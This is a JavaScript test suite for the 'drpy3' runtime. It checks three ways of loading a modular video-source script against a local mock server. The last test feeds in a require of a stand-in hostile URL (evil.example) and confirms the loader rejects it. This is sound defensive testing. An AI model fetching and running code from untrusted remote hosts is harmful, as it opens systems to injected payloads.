// W8 验收：模块化（§8）——百忙无果3.js（依赖 ./lib + ?bytes wasm 资产）三模式均可跑：
//   模式 A：原生 ESM（宿主 evalModule staging，'drpy3' 别名 + ?bytes 资产模块）
//   模式 B：esbuild 预打包单文件（drpy3 external）
//   模式 C：内置 CJS shim（简单 ESM 预转换 + require 装载，?bytes 经 loadAsset 字节读）
import {test} from 'node:test';
import assert from 'node:assert/strict';
import {spawn} from 'node:child_process';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import {fileURLToPath} from 'node:url';
import {Runtime} from '../src/drpy3/index.js';
import {makeNodeHost} from '../cli/node-host.mjs';
import {buildSource} from '../cli/drpy3-build.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, '..');
const PORT = 19775;
const B = `http://127.0.0.1:${PORT}`;

// 手写最小 wasm：func xxh64(i32,i32)->i32 { local.get 1 }——演示稿 wasm.exports.xxh64(str, seed) 可直调
// （JS 参数经 ToNumber 隐式转换；返回 seed 掩码值，.toString(16) 即十六进制 sign 串）
const SIGN_WASM = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01,
    0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x09, 0x01, 0x05, 0x78, 0x78, 0x68, 0x36, 0x34, 0x00, 0x00,
    0x0a, 0x06, 0x01, 0x04, 0x00, 0x20, 0x01, 0x0b,
]);

async function waitMockReady(base, timeoutMs = 10000) {
    const start = Date.now();
    while (Date.now() - start < timeoutMs) {
        const ok = await new Promise((resolve) => {
            const req = http.get(base + '/rider/list?probe=1', (res) => {
                res.resume();
                resolve(res.statusCode === 200);
            });
            req.on('error', () => resolve(false));
            req.setTimeout(1000, () => { req.destroy(); resolve(false); });
        });
        if (ok) return;
        await new Promise((r) => setTimeout(r, 150));
    }
    throw new Error('mock 服务器未就绪: ' + base);
}

/** staged 源目录包：source.js + lib/mgtv.js + lib/sign.wasm（域名重写到 mock） */
function stageDemo3(stageDir) {
    fs.mkdirSync(path.join(stageDir, 'lib'), {recursive: true});
    let code = fs.readFileSync(path.join(ROOT, 'docs', '百忙无果3.js'), 'utf8');
    for (const h of ['https://pianku.api.%6d%67%74%76.com', 'https://mobileso.bz.mgtv.com',
        'https://pcweb.api.mgtv.com', 'https://www.mgtv.com']) code = code.replaceAll(h, B);
    fs.writeFileSync(path.join(stageDir, 'source.js'), code);
    let lib = fs.readFileSync(path.join(ROOT, 'docs', '百忙无果3.lib.js'), 'utf8');
    for (const h of ['https://www.mgtv.com']) lib = lib.replaceAll(h, B);
    fs.writeFileSync(path.join(stageDir, 'lib', 'mgtv.js'), lib);
    fs.writeFileSync(path.join(stageDir, 'lib', 'sign.wasm'), SIGN_WASM);
    return code;
}

async function runStages(assert2, rt, code, opts) {
    const src = await rt.load(code, opts);
    await src.init('');
    const home = await src.home('');
    assert2.equal(home.class.length, 7, 'home：7 分类');
    const search = await src.search('斗罗大陆', false, 1);
    assert2.equal(search.list.length, 1, 'search：1 条（含 wasm 签名请求）');
    assert2.equal(search.list[0].vod_name, '斗罗大陆');
    assert2.equal(search.list[0].vod_id, '50$vid9');
    const detail = await src.detail('50$vid9');
    assert2.equal(detail.list[0].vod_name, '测试影片全名', 'detail：模块化两段式');
    assert2.ok(String(detail.list[0].vod_play_url).includes('第1集$'), 'detail：选集组装');
    return src;
}

test('W8 模式 A：原生 ESM 装载（evalModule staging + ?bytes 资产 + wasm 签名搜索）', {timeout: 60000}, async () => {
    const mock = spawn(process.execPath, [path.join(HERE, 'helpers', 'mock-server.mjs')], {
        env: {...process.env, MOCK_PORT: String(PORT)}, stdio: 'ignore',
    });
    try {
        await waitMockReady(B);
        const stageDir = fs.mkdtempSync(path.join(os.tmpdir(), 'drpy3-modA-'));
        const code = stageDemo3(stageDir);
        const rt = new Runtime(makeNodeHost({sourceDir: stageDir}));
        await runStages(assert, rt, code, {path: 'source.js', key: '_modA'});
        fs.rmSync(stageDir, {recursive: true, force: true});
    } finally {
        mock.kill();
    }
});

test('W8 模式 B：esbuild 预打包单文件（drpy3 external，中性求值装载）', {timeout: 60000}, async () => {
    const mock = spawn(process.execPath, [path.join(HERE, 'helpers', 'mock-server.mjs')], {
        env: {...process.env, MOCK_PORT: String(PORT)}, stdio: 'ignore',
    });
    try {
        await waitMockReady(B);
        const stageDir = fs.mkdtempSync(path.join(os.tmpdir(), 'drpy3-modB-'));
        const code = stageDemo3(stageDir);
        const entry = path.join(stageDir, 'source.js');
        const outfile = path.join(stageDir, 'source.bundle.js');
        await buildSource(entry, outfile);
        const bundled = fs.readFileSync(outfile, 'utf8');
        assert.ok(!/from\s+['"]\.\/lib\//.test(bundled), '模式B：相对模块已内联');
        assert.ok(/from\s+["']drpy3["']/.test(bundled), '模式B：drpy3 保持 external');
        const rt = new Runtime(makeNodeHost({sourceDir: stageDir, nativeEsm: false})); // 关闭模式A → 中性求值
        await runStages(assert, rt, bundled, {key: '_modB'});
        fs.rmSync(stageDir, {recursive: true, force: true});
    } finally {
        mock.kill();
    }
});

test('W8 模式 C：内置 CJS shim（简单 ESM 预转换 + ?bytes 字节装载）', {timeout: 60000}, async () => {
    const mock = spawn(process.execPath, [path.join(HERE, 'helpers', 'mock-server.mjs')], {
        env: {...process.env, MOCK_PORT: String(PORT)}, stdio: 'ignore',
    });
    try {
        await waitMockReady(B);
        const stageDir = fs.mkdtempSync(path.join(os.tmpdir(), 'drpy3-modC-'));
        const code = stageDemo3(stageDir);
        const rt = new Runtime(makeNodeHost({sourceDir: stageDir}));
        await runStages(assert, rt, code, {path: 'source.js', key: '_modC', mode: 'cjs'});
        fs.rmSync(stageDir, {recursive: true, force: true});
    } finally {
        mock.kill();
    }
});

test('W8 红线：远端 require 拒绝（§8.2，模块必须随源分发）', async () => {
    const {evalSourceCjs} = await import('../src/drpy3/modules/loader.js');
    const rt = new Runtime(makeNodeHost({sourceDir: fs.mkdtempSync(path.join(os.tmpdir(), 'drpy3-r-'))}));
    await assert.rejects(
        () => evalSourceCjs(`const x = require('https://evil.example/x.js');
export default {meta: {}}`, {path: 'r.js'}, rt),
        (e) => /远端 require 被拒绝/.test(e.message),
    );
    await assert.rejects(
        () => evalSourceCjs(`const x = require('lodash');
export default {meta: {}}`, {path: 'r.js'}, rt),
        (e) => /仅支持相对路径模块/.test(e.message),
    );
});
